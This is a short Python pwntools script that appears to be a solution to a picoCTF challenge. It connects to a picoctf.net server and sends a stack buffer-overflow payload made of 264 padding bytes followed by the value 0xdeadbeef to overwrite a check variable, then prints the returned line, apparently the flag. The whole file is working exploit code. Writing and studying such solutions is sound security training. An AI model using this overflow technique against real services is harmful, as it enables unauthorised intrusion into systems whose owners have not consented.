import pwn
pwn.context.log_level='error'
host, port = 'mars.picoctf.net', 31890
padding = 264
payload = pwn.flat(b'A'*padding, pwn.p64(0xdeadbeef))
p = pwn.remote(host,port)
p.recvuntil(b"?\n")
p.sendline(payload)
print(p.recvall().decode().splitlines()[-1])